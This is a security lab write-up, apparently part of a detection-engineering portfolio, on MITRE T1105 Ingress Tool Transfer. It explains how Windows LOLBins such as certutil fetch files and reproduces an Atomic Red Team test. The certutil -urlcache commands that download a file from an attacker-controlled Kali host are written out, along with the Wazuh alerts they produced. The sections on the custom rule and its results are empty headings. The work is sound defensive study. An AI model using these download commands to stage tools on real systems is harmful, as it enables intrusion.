# T1105 - Ingress Tool Transfer

## Overview

The technique I am covering in these findings is T1105, Ingress Tool Transfer, which sits under Command and Control. This is the last of my six rules and it is the third one in the set I started with 100104, the group where the attacker is acting from outside the endpoint rather than typing at it. 100104 correlated failed logons against a success to catch hydra coming in from the Kali box, 100105 caught the endpoint opening a channel back out to that same box over an uncommon port, and this rule is about what happens after a channel like that exists. By the time this technique comes into play the attacker already has a foothold, and the problem they have is that whatever they actually want to run is not on the machine yet. What they do have is everything Windows came with, so they use one of those to go and pull the rest of it down. That is T1105, and it is the point in the chain where the attacker stops working with what was already on the endpoint and starts bringing their own toolkit onto it.

What makes this technique different from the five before it is that the attacker is not bringing a program with them at all and they are not typing anything malicious either, they are borrowing one of mine. `certutil.exe` exists to manage certificates, `bitsadmin.exe` exists to manage background transfers, `regsvr32.exe` exists to register DLLs and `mshta.exe` exists to run HTML applications. Every one of those is a signed Microsoft binary that ships with Windows, they live in `System32`, and they have a completely legitimate reason to be on the disk, and every one of them can also be pointed at a URL and told to pull a file down. That is what a LOLBin is, a living-off-the-land binary, and it is a problem for detection because there is not much to get hold of. Nothing has to be written to disk before the transfer start since the executable was on the endpoint before the attacker was, and the process opening the connection is one that could be running for ordinary reasons, so going through a process list would not tell you anything was wrong.

That changes what my rule is able to claim, although what it claims is very close to what 100105 claims. Neither of those two rules is saying that something malicious happened, they are both describing something that is not supposed to happen and then firing when it does. My first three rules do say that, because the decision was made before the rule existed. I looked at an encoded command and at an auditpol flag and judged them malicious, so what comes out of those rules is a verdict rather than an observation, and it arrives with the conclusion already attached.

100105 and this rule do the reverse. Neither of them is making that accusation, and neither is claiming that what it caught was malicious. All this rule says is that something happened which is out of place, and that it is strange enough to be worth looking into, and the person reading the alert is the one who decides what it actually was.

They both work by describing what is supposed to happen and firing on anything outside that description. In 100105 that description was the ports a Windows endpoint has a reason to open, and in this one it is the programs that have a reason to open a connection at all. Neither of them reads anything somebody typed. Where they differ is which end of the connection I am judging. With 100105 the program was ordinary since PowerShell opens connections all the time, and the destination was the part that was wrong, so the rule reads the port. Here it is the other way round. The port and the address are not what I am looking at, because the connection could go to any address over any port and it would not change my mind. The program that opened it is the part that is wrong, since `certutil.exe` reaching out to the network is strange in a way that `certutil.exe` merely existing is not. The detection is built on the idea that some binaries normally have no business making outbound connections, regardless of what they connect to or why.

The reason I picked this technique in particular is that it is the next thing in the sequence. My first three rules all begin with the attacker already on the endpoint and running something on it, and what I am trying to catch is the command they typed, so none of them has anything to say about how the attacker got there in the first place. 100104 was me starting from the other end of that, which is how somebody gets onto the endpoint at all and what they are doing to it from outside, and once that rule existed the one after it should be the next step in the same story rather than another angle on the step before. So 100104 is somebody getting in, 100105 is them opening a channel back out, and this one is them using that channel to pull across the tools they did not arrive with. That difference shows up in the rules themselves too. 100100, 100102 and 100103 all read `win.eventdata.commandLine` and decide the string sitting in it looks wrong, which makes them three angles on one kind of detection. 100104, 100105 and 100106 do not read a command line at all. One rule correlates authentication events, the other rule reads the direction and port of a connection, and this one reads the image that opened it. 


## Attack Execution

The test I ran is Atomic Red Team test 7 under T1105, "certutil download (urlcache)", with the GUID `dd3b61dd-7bbc-48cd-ab51-49ad1a776df0`. It uses certutil's `-urlcache` argument to download a file from the web, it only supports Windows, and it runs through the command prompt rather than PowerShell.

```
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
```

The inputs default to a `LICENSE.txt` out of the atomic-red-team repository on `raw.githubusercontent.com`. The command I ran is:

```
cmd /c certutil -urlcache -split -f http://192.168.10.52:8000/[NEEDS filename] [NEEDS local path]
```

I only changed the URL, for the same reason I redirected the connection in finding 05. As it ships the test proves my endpoint can reach GitHub, and T1105 is a file being pulled off infrastructure the attacker controls, so it needs to point at 192.168.10.52, which is the same Kali box from findings 01 and 05.

On Kali I served the file with `python3 -m http.server 8000`. In finding 05 an `nc` listener was enough because the connection itself was the technique, but here the transfer has to complete, so the listener had to be something that actually speaks HTTP.

The command is not an attack, in the same way `Test-NetConnection` was not. certutil ships with Windows and fetching a file over HTTP is documented behaviour, so what makes it the technique is who asked for it and what is at the other end, and neither of those is in the event.

I did not write the rule against the command line because the arguments are the part that varies. certutil takes `-urlcache` or `-verifyctl`, a slash instead of a dash, `-f` anywhere or not at all, and every other binary in the technique has its own syntax entirely. All of them have to open a socket though, and the socket looks the same whichever flag produced it.

What matters for the rule is that `cmd.exe` does not open that socket. It spawns `certutil.exe`, and certutil is what opens it, so the connection event carries certutil as its image rather than the shell that launched it. That is the opposite of finding 05, where PowerShell opened the socket itself, and it is why this rule can key on the process at all.


## Baseline Alert

<img width="1280" height="868" alt="image" src="https://github.com/user-attachments/assets/cc060da7-df98-4198-b011-497e67eb3e79" />

These are the alerts produced by Wazuh's shipped ruleset with 100106 commented out. The window runs from 21:35:00 to 21:36:51 and holds 61 alerts, and none of them are about the connection.

Most of the volume is 67027 at level 3, "A process was created", which is the same noise floor that turns up in every finding I have run.

Three alerts belong to the test. 92052 at level 4, "Windows command prompt started by an abnormal process", is the `cmd.exe` the atomic launches being started out of my PowerShell session, so it is describing the test harness rather than the technique. The other two are both 92032 at level 3, "Suspicious Windows cmd shell execution", and there are two of them because I ran the test twice. Windows Defender flagged the first run, so I ran it again thinking the download had not gone through, when it actually had. The command is in both of those alerts in full, twice over, once as the command line of the process itself and once as the parent command line of the `cmd.exe` that launched it.

```
certutil  -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
cmd  /c certutil -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
```

92032 is tagged T1087 Account Discovery under Discovery and T1059.003 Windows Command Shell under Execution. Nothing in the run carried T1105, and nothing carried Command and Control. Sysmon's own tag on the process creation event reads `technique_id=T1202,technique_name=Indirect Command Execution`, which is the config's opinion rather than Wazuh's, and it is a third technique again.

The connection produced nothing. `certutil.exe` opened a socket to 192.168.10.52 on port 8000 and Sysmon wrote the Event 3 for it, and no shipped rule matched it.

## Detection Gap

## My Detection Rule

## Custom Detection Rule Result

## Coverage Limits
